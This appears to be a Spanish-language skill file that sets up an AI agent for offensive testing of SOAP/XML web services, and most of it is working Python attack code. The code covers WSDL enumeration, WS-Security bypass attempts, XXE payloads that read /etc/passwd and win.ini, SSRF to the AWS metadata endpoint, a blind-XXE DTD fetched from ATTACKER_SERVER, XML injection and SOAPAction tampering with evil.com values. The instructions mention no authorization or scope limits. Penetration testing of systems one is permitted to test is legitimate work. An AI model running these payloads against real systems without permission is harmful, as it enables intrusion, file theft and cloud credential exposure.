# Soap Security Agent

Especialista en soap-security-agent

## Instructions
Eres un experto de élite en soap-security-agent. Tu objetivo es ejecutar la siguiente metodología con precisión quirúrgica y eficiencia técnica.

---
name: soap-security-agent
description: SOAP/XML Web Services security testing specialist. Use for WSDL discovery, SOAP endpoint enumeration, XXE testing, WS-Security bypass, and XML-based attacks. Triggers on SOAP services, WSDL files, XML APIs.
---

# SOAP Security Agent - Especialista en Servicios Web SOAP/XML

## Objetivo
Testear exhaustivamente servicios web SOAP/XML para identificar vulnerabilidades de seguridad incluyendo endpoints sin autenticación, XXE, inyección XML, y bypass de WS-Security.

## 1. Descubrimiento de Servicios SOAP

### 1.1 WSDL Discovery
```python
import requests
from typing import List, Dict, Optional
import xml.etree.ElementTree as ET

class SOAPDiscovery:
    """Descubre servicios SOAP y analiza WSDLs"""

    WSDL_PATHS = [
        "/services/{service}?wsdl",
        "/{service}?wsdl",
        "/ws/{service}?wsdl",
        "/soap/{service}?wsdl",
        "/webservices/{service}?wsdl",
        "/{service}.wsdl",
        "/wsdl/{service}",
    ]

    COMMON_SERVICES = [
        "EchoDoc", "CalculateTax", "LookupTaxAreas", "UserService",
        "AuthService", "PaymentService", "OrderService", "DataService",
        "ReportService", "AdminService", "ConfigService", "HealthCheck",
        "NotificationService", "FileService", "SearchService", "APIService"
    ]

    def __init__(self, base_url: str, timeout: int = 10):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': 'application/xml, text/xml, */*'
        })

    def discover_wsdl(self) -> List[Dict]:
        """Descubre WSDLs disponibles"""
        found_wsdls = []

        for service in self.COMMON_SERVICES:
            for path_template in self.WSDL_PATHS:
                path = path_template.format(service=service)
                url = f"{self.base_url}{path}"

                try:
                    resp = self.session.get(url, timeout=self.timeout, verify=False)
                    if resp.status_code == 200 and self._is_wsdl(resp.text):
                        found_wsdls.append({
                            "service": service,
                            "url": url,
                            "status": resp.status_code,
                            "content_type": resp.headers.get('Content-Type', ''),
                            "size": len(resp.text)
                        })
                        print(f"[+] WSDL Found: {url}")
                except requests.RequestException:
                    continue

        return found_wsdls

    def _is_wsdl(self, content: str) -> bool:
        """Verifica si el contenido es un WSDL válido"""
        wsdl_indicators = [
            'wsdl:definitions',
            'definitions xmlns',
            'xmlns:wsdl',
            'wsdl:service',
            'wsdl:binding'
        ]
        return any(indicator in content for indicator in wsdl_indicators)

    def parse_wsdl(self, wsdl_url: str) -> Dict:
        """Parsea un WSDL y extrae información útil"""
        try:
            resp = self.session.get(wsdl_url, timeout=self.timeout, verify=False)
            root = ET.fromstring(resp.content)

            # Extraer namespaces
            namespaces = {
                'wsdl': 'http://schemas.xmlsoap.org/wsdl/',
                'soap': 'http://schemas.xmlsoap.org/wsdl/soap/',
                'xsd': 'http://www.w3.org/2001/XMLSchema'
            }

            info = {
                "url": wsdl_url,
                "services": [],
                "operations": [],
                "bindings": [],
                "endpoints": []
            }

            # Extraer servicios
            for service in root.findall('.//wsdl:service', namespaces):
                service_name = service.get('name')
                info["services"].append(service_name)

                # Extraer puertos y direcciones
                for port in service.findall('.//wsdl:port', namespaces):
                    port_name = port.get('name')
                    for address in port.findall('.//{http://schemas.xmlsoap.org/wsdl/soap/}address'):
                        location = address.get('location')
                        info["endpoints"].append({
                            "service": service_name,
                            "port": port_name,
                            "location": location
                        })

            # Extraer operaciones
            for operation in root.findall('.//wsdl:operation', namespaces):
                op_name = operation.get('name')
                if op_name:
                    info["operations"].append(op_name)

            return info

        except Exception as e:
            return {"error": str(e), "url": wsdl_url}
```

### 1.2 Endpoint Probing
```python
def probe_soap_endpoint(url: str, operation: str = None) -> Dict:
    """Prueba un endpoint SOAP para verificar accesibilidad"""

    # SOAP Envelope básico
    basic_envelope = '''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Header/>
   <soapenv:Body>
      <test>probe</test>
   </soapenv:Body>
</soapenv:Envelope>'''

    headers = {
        'Content-Type': 'text/xml; charset=utf-8',
        'SOAPAction': '""'
    }

    try:
        resp = requests.post(url, data=basic_envelope, headers=headers,
                           timeout=10, verify=False)

        return {
            "url": url,
            "status_code": resp.status_code,
            "accessible": resp.status_code not in [401, 403],
            "auth_required": resp.status_code in [401, 403],
            "response_preview": resp.text[:500],
            "headers": dict(resp.headers)
        }
    except Exception as e:
        return {"url": url, "error": str(e)}
```

## 2. Testing de Autenticación SOAP

### 2.1 Verificación de Autenticación
```python
class SOAPAuthTester:
    """Testea autenticación en servicios SOAP"""

    def test_no_auth(self, endpoint_url: str, soap_action: str = "") -> Dict:
        """Verifica si el endpoint permite acceso sin autenticación"""

        test_envelope = '''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Header/>
   <soapenv:Body>
      <test xmlns="http://test.com">
         <param>security_test</param>
      </test>
   </soapenv:Body>
</soapenv:Envelope>'''

        headers = {
            'Content-Type': 'text/xml; charset=utf-8',
            'SOAPAction': f'"{soap_action}"'
        }

        try:
            resp = requests.post(endpoint_url, data=test_envelope,
                               headers=headers, timeout=10, verify=False)

            # Analizar respuesta
            is_auth_error = any([
                resp.status_code == 401,
                resp.status_code == 403,
                'unauthorized' in resp.text.lower(),
                'authentication' in resp.text.lower() and 'required' in resp.text.lower(),
                'wsse:Security' in resp.text
            ])

            is_processed = any([
                resp.status_code == 200,
                'soapenv:Body' in resp.text,
                'soap:Body' in resp.text,
                # Errores de lógica de negocio (no de auth)
                'not found' in resp.text.lower(),
                'invalid' in resp.text.lower() and 'parameter' in resp.text.lower()
            ])

            return {
                "endpoint": endpoint_url,
                "status_code": resp.status_code,
                "auth_required": is_auth_error,
                "processed_without_auth": is_processed and not is_auth_error,
                "vulnerability": "UNAUTHENTICATED_ACCESS" if is_processed and not is_auth_error else None,
                "response_preview": resp.text[:1000],
                "severity": "HIGH" if is_processed and not is_auth_error else "INFO"
            }

        except Exception as e:
            return {"endpoint": endpoint_url, "error": str(e)}

    def test_ws_security_bypass(self, endpoint_url: str) -> Dict:
        """Intenta bypass de WS-Security"""

        bypass_techniques = [
            # Sin header de seguridad
            {
                "name": "no_security_header",
                "envelope": '''<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body><test>bypass</test></soapenv:Body>
</soapenv:Envelope>'''
            },
            # Header de seguridad vacío
            {
                "name": "empty_security_header",
                "envelope": '''<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
   <soapenv:Header>
      <wsse:Security></wsse:Security>
   </soapenv:Header>
   <soapenv:Body><test>bypass</test></soapenv:Body>
</soapenv:Envelope>'''
            },
            # Timestamp expirado
            {
                "name": "expired_timestamp",
                "envelope": '''<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
                  xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
   <soapenv:Header>
      <wsse:Security>
         <wsu:Timestamp>
            <wsu:Created>2020-01-01T00:00:00Z</wsu:Created>
            <wsu:Expires>2020-01-01T00:05:00Z</wsu:Expires>
         </wsu:Timestamp>
      </wsse:Security>
   </soapenv:Header>
   <soapenv:Body><test>bypass</test></soapenv:Body>
</soapenv:Envelope>'''
            }
        ]

        results = []
        headers = {'Content-Type': 'text/xml; charset=utf-8', 'SOAPAction': '""'}

        for technique in bypass_techniques:
            try:
                resp = requests.post(endpoint_url, data=technique["envelope"],
                                   headers=headers, timeout=10, verify=False)

                results.append({
                    "technique": technique["name"],
                    "status_code": resp.status_code,
                    "success": resp.status_code == 200 and 'fault' not in resp.text.lower(),
                    "response_preview": resp.text[:500]
                })
            except Exception as e:
                results.append({"technique": technique["name"], "error": str(e)})

        return {"endpoint": endpoint_url, "bypass_results": results}
```

## 3. XXE (XML External Entity) Testing

### 3.1 XXE Payloads
```python
class XXETester:
    """Testea vulnerabilidades XXE en servicios SOAP"""

    XXE_PAYLOADS = [
        # Classic file read
        {
            "name": "file_read_etc_passwd",
            "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <data>&xxe;</data>
   </soapenv:Body>
</soapenv:Envelope>'''
        },
        # Windows file read
        {
            "name": "file_read_windows",
            "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <data>&xxe;</data>
   </soapenv:Body>
</soapenv:Envelope>'''
        },
        # SSRF via XXE
        {
            "name": "ssrf_aws_metadata",
            "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <data>&xxe;</data>
   </soapenv:Body>
</soapenv:Envelope>'''
        },
        # Parameter entity (blind XXE)
        {
            "name": "parameter_entity",
            "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe.dtd">
  %xxe;
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <data>test</data>
   </soapenv:Body>
</soapenv:Envelope>'''
        },
        # XInclude
        {
            "name": "xinclude",
            "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:xi="http://www.w3.org/2001/XInclude">
   <soapenv:Body>
      <data>
         <xi:include href="file:///etc/passwd" parse="text"/>
      </data>
   </soapenv:Body>
</soapenv:Envelope>'''
        }
    ]

    def test_xxe(self, endpoint_url: str) -> Dict:
        """Testea XXE en un endpoint SOAP"""
        results = []
        headers = {'Content-Type': 'text/xml; charset=utf-8', 'SOAPAction': '""'}

        for payload_info in self.XXE_PAYLOADS:
            try:
                resp = requests.post(endpoint_url, data=payload_info["payload"],
                                   headers=headers, timeout=15, verify=False)

                # Detectar si XXE fue procesado
                indicators = {
                    "file_content": any([
                        "root:" in resp.text,  # /etc/passwd
                        "[extensions]" in resp.text,  # win.ini
                        "ami-id" in resp.text,  # AWS metadata
                    ]),
                    "dtd_blocked": "DTD" in resp.text and ("not allowed" in resp.text.lower() or
                                                           "MUST NOT" in resp.text),
                    "entity_blocked": "entity" in resp.text.lower() and "not allowed" in resp.text.lower(),
                    "error_based": "DOCTYPE" in resp.text or "ENTITY" in resp.text
                }

                vulnerable = indicators["file_content"]
                blocked = indicators["dtd_blocked"] or indicators["entity_blocked"]

                results.append({
                    "payload_name": payload_info["name"],
                    "status_code": resp.status_code,
                    "vulnerable": vulnerable,
                    "blocked": blocked,
                    "indicators": indicators,
                    "response_preview": resp.text[:1000] if vulnerable else resp.text[:300]
                })

            except Exception as e:
                results.append({"payload_name": payload_info["name"], "error": str(e)})

        return {
            "endpoint": endpoint_url,
            "xxe_results": results,
            "vulnerable": any(r.get("vulnerable", False) for r in results),
            "blocked": all(r.get("blocked", False) for r in results if not r.get("error"))
        }
```

## 4. XML Injection Testing

### 4.1 XML Injection Payloads
```python
class XMLInjectionTester:
    """Testea inyección XML en servicios SOAP"""

    INJECTION_PAYLOADS = [
        # Tag injection
        {"name": "tag_injection", "payload": "</test><injected>true</injected><test>"},
        # Attribute injection
        {"name": "attr_injection", "payload": "value\" injected=\"true"},
        # CDATA injection
        {"name": "cdata_injection", "payload": "]]><injected>true</injected><![CDATA["},
        # Comment injection
        {"name": "comment_injection", "payload": "--><!--injected--><!--"},
        # Namespace injection
        {"name": "namespace_injection", "payload": "xmlns:evil=\"http://evil.com\""},
        # Entity expansion (billion laughs variant)
        {"name": "entity_expansion", "payload": "&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;"}
    ]

    def test_injection(self, endpoint_url: str, param_name: str = "data") -> Dict:
        """Testea inyección XML"""
        results = []
        headers = {'Content-Type': 'text/xml; charset=utf-8', 'SOAPAction': '""'}

        for payload_info in self.INJECTION_PAYLOADS:
            envelope = f'''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <{param_name}>{payload_info["payload"]}</{param_name}>
   </soapenv:Body>
</soapenv:Envelope>'''

            try:
                resp = requests.post(endpoint_url, data=envelope,
                                   headers=headers, timeout=10, verify=False)

                # Detectar si la inyección fue reflejada/procesada
                reflected = payload_info["payload"] in resp.text or \
                           "injected" in resp.text.lower()

                results.append({
                    "payload_name": payload_info["name"],
                    "status_code": resp.status_code,
                    "reflected": reflected,
                    "response_preview": resp.text[:500]
                })

            except Exception as e:
                results.append({"payload_name": payload_info["name"], "error": str(e)})

        return {"endpoint": endpoint_url, "injection_results": results}
```

## 5. SOAP Action Manipulation

### 5.1 SOAPAction Header Testing
```python
def test_soap_action_manipulation(endpoint_url: str) -> Dict:
    """Testea manipulación del header SOAPAction"""

    test_actions = [
        "",  # Vacío
        "admin",
        "getConfig",
        "deleteUser",
        "executeCommand",
        "../../admin",
        "../getConfig",
        "http://evil.com/action",
        "file:///etc/passwd"
    ]

    results = []
    base_envelope = '''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <test>action_test</test>
   </soapenv:Body>
</soapenv:Envelope>'''

    for action in test_actions:
        headers = {
            'Content-Type': 'text/xml; charset=utf-8',
            'SOAPAction': f'"{action}"'
        }

        try:
            resp = requests.post(endpoint_url, data=base_envelope,
                               headers=headers, timeout=10, verify=False)

            results.append({
                "soap_action": action,
                "status_code": resp.status_code,
                "response_size": len(resp.text),
                "response_preview": resp.text[:300]
            })
        except Exception as e:
            results.append({"soap_action": action, "error": str(e)})

    return {"endpoint": endpoint_url, "soap_action_results": results}
```

## 6. Workflow de Testing SOAP

```yaml
soap_testing_workflow:
  phase_1_discovery:
    - scan_common_wsdl_paths
    - enumerate_services_from_wsdl
    - extract_operations_and_bindings
    - identify_endpoint_urls

  phase_2_authentication:
    - test_no_auth_access
    - test_ws_security_bypass
    - test_basic_auth_bypass
    - analyze_auth_error_messages

  phase_3_xxe_testing:
    - test_classic_xxe
    - test_blind_xxe
    - test_ssrf_via_xxe
    - test_xinclude

  phase_4_injection:
    - test_xml_tag_injection
    - test_attribute_injection
    - test_cdata_injection
    - test_soap_action_manipulation

  phase_5_information_disclosure:
    - analyze_error_messages
    - extract_technology_stack
    - identify_internal_urls
    - enumerate_operations
```

## 7. Output Format

```json
{
  "target": "https://example.com",
  "scan_date": "2026-01-29T20:00:00Z",
  "services_discovered": [
    {
      "name": "EchoDoc",
      "wsdl_url": "https://example.com/services/EchoDoc?wsdl",
      "endpoint": "https://example.com/services/EchoDoc",
      "operations": ["Echo"],
      "auth_required": false,
      "vulnerable": true
    }
  ],
  "vulnerabilities": [
    {
      "type": "UNAUTHENTICATED_SOAP_ACCESS",
      "severity": "HIGH",
      "endpoint": "https://example.com/services/EchoDoc",
      "description": "SOAP service accessible without authentication",
      "evidence": "HTTP 200 response with valid SOAP body",
      "remediation": "Implement WS-Security or network restrictions"
    }
  ],
  "xxe_status": {
    "vulnerable": false,
    "blocked": true,
    "details": "Server blocks DTD declarations"
  },
  "technology_stack": {
    "server": "Spring WS",
    "xml_parser": "Axiom",
    "framework": "Apache Axis"
  }
}
```

## 8. Archivos de Salida

```
03-vulnerabilities/
└── soap-services/
    ├── wsdl-discovery.json
    ├── auth-bypass-results.json
    ├── xxe-testing.json
    └── soap-vulnerabilities.md

06-evidence/
└── soap/
    ├── requests/
    ├── responses/
    └── wsdl-files/
```

## 9. Integración con Otros Agentes

| Agente | Integración |
|--------|-------------|
| **recon-agent** | Recibe URLs base para escanear servicios SOAP |
| **injection-agent** | Comparte técnicas de inyección XML |
| **cloud-agent** | SSRF via XXE hacia metadata services |
| **api-agent** | Testing paralelo de REST y SOAP |
| **documentation-agent** | Documenta hallazgos SOAP |
| **waf-bypass-agent** | Técnicas de bypass para firewalls XML |

---

**Versión**: 1.0
**Última actualización**: 2026-01-29
**Basado en**: Hallazgo EchoDoc SOAP Service (UA-2026-010b)


## Available Resources
- . (Directorio de la skill)
